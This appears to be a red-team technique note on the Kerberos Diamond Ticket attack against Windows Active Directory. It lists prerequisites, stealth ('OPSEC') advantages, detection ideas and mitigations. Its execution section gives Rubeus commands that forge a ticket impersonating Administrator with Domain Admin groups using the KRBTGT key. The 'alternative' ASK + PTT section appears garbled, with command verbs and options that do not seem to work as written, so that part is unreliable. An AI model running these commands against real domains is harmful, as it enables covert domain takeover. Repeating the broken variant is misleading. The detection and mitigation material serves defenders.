---
tags:
  - "#type/technique"
  - "#tactic/TA0003"
  - "#tactic/TA0008"
  - "#technique/T1558.001"
  - "#stage/persistence"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#protocol/kerberos"
  - "#tool/rubeus"
  - "#opsec/low-detection"
aliases:
  - Diamond Ticket Attack
  - Modified Kerberos Ticket
  - Stealthier Golden Ticket
---

## Technique
___

A Diamond Ticket is an evolution of the Golden Ticket technique that offers improved operational security. Instead of creating a completely forged ticket as in a Golden Ticket attack, a Diamond Ticket starts with a legitimate Kerberos ticket issued by a Domain Controller and then selectively modifies specific fields.

This approach maintains most of the legitimate ticket's properties while altering critical elements like the user identity or group memberships. Since the ticket was initially created by the Domain Controller itself, it will contain all the correct details from the domain's Kerberos policy, making it harder to detect compared to completely forged tickets.

## Prerequisites
___

**Access Level:** 
- Access to the KRBTGT account's password hash (typically requires Domain Admin privileges or similar access to obtain)
- The ability to request legitimate tickets in the domain

**Information Needed:**
- Domain name
- KRBTGT NTLM hash or AES keys
- Domain SID
- User to impersonate

**Tools:** Specialized tools that support Diamond Ticket creation, such as Rubeus

## Considerations
___

**Impact**

Diamond Tickets provide domain-wide persistence and lateral movement capabilities with enhanced stealth, allowing an attacker to:
- Access any resource in the domain as any user
- Modify group memberships to elevate privileges
- Operate with reduced risk of detection compared to Golden Tickets

**OPSEC Advantages**

- Unlike Golden Tickets, Diamond Tickets have an AS-REQ (Authentication Service Request) preceding the TGS-REQ (Ticket-Granting Service Request), making them appear more legitimate
- Legitimate ticket values are preserved where possible
- The ticket contains correct timestamps, encryption types, and other domain Kerberos policy settings
- Less likely to trigger alerts based on ticket anomalies

## Execution
___

### Using Rubeus for Diamond Tickets

1. Request a legitimate TGT for a user:

```powershell
Rubeus.exe asktgt /user:regularuser /password:Password123 /domain:contoso.local /nowrap
```

2. Use the obtained TGT and modify it with the Diamond Ticket technique:

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520 /krbkey:HASHOFKRBTGTACCOUNT /domain:contoso.local /dc:dc01.contoso.local /ptt
```

The parameters used:
- `/tgtdeleg`: Obtains a legitimate TGT through Kerberos delegation
- `/ticketuser`: The user to impersonate
- `/ticketuserid`: The RID of the user to impersonate
- `/groups`: The group IDs to add to the ticket (including Domain Admins - 512)
- `/krbkey`: The KRBTGT account hash
- `/domain`: The domain name
- `/dc`: The domain controller to request the ticket from
- `/ptt`: Pass the ticket into the current session

### Alternative Using Rubeus ASK + PTT

Another approach is to request a legitimate ticket and then manipulate it before injecting:

```powershell
# First, request a TGT but save it to a variable instead of injecting it
$ticket = Rubeus.exe ask /user:regularuser /password:Password123 /domain:contoso.local /nowrap

# Then modify the ticket and inject it
Rubeus.exe ptt /ticket:$ticket /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520 /krbkey:HASHOFKRBTGTACCOUNT
```

## Detection & Mitigation
___

### Detection

Diamond Tickets are more difficult to detect than Golden Tickets, but some strategies include:

- Look for discrepancies between the user account in the ticket and their typical group memberships
- Monitor for high-privilege actions from accounts that normally don't have such privileges
- Analyze Kerberos tickets for signs of tampering, such as unusual PAC modifications
- Track access patterns for sensitive resources to identify anomalous access

### Mitigation

- Regularly rotate the KRBTGT account password (twice to invalidate all previous tickets)
- Implement robust monitoring for suspicious Kerberos ticket usage
- Deploy Advanced Threat Analytics or Microsoft Defender for Identity to detect suspicious Kerberos activity
- Use Protected Users security group for privileged accounts
- Implement the principle of least privilege and use time-based access where possible
- Deploy Privileged Access Workstations (PAWs) for administrative tasks
- Consider implementing a tiered administration model to limit the risk of credential theft